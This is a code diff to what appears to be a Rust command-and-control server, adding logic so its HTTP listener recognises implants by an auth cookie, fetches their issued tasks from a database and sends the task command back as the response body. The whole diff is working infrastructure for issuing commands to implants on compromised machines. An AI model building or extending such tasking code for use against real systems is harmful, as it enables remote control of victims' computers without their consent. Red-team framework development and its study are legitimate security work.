@@ -12,7 +12,7 @@ use std::io;
 use std::io::prelude::*;
 use std::net::{TcpListener, TcpStream};
 
-use crate::models::ListenerSignal;
+use crate::models::{ListenerSignal, ImplantTaskStatus};
 use crate::models::ListenerState;
 use crate::settings;
 use crate::database;
@@ -31,7 +31,7 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
 
     let (http_response_headers, response_body_page_path) = prepare_http_response(buffer);
 
-    let http_response_body = if Path::new(&response_body_page_path).exists()
+    let mut http_response_body = if Path::new(&response_body_page_path).exists()
     {
         match fs::read(response_body_page_path)
         {
@@ -66,6 +66,18 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
             {
                 println!("[!] Couldn't update the timestamp of the implant with this cookie");
                 println!("\t{}", &implant_auth_cookie);
+            }
+
+            let mut include_statuses: Vec<String> = Vec::new();
+            include_statuses.push(ImplantTaskStatus::Issued.to_string());
+
+            let implant_tasks = database::get_implant_tasks("CookieHash", &implant_auth_cookie, include_statuses);
+            for task in implant_tasks
+            {
+                http_response_body = prepare_http_response_task_command(task.command);
+                
+                // database::remove_implant_task(task.id);
+                break;
             }
         }
     }
@@ -202,4 +214,10 @@ fn check_if_implant(buffer: [u8; 1024]) -> (bool, String)
     }
 
     return (is_implant, implant_auth_cookie);
+}
+
+fn prepare_http_response_task_command(task_command: String) -> Vec<u8>
+{
+    let http_response_bytes: Vec<u8> = task_command.as_bytes().to_vec();
+    return http_response_bytes;
 }
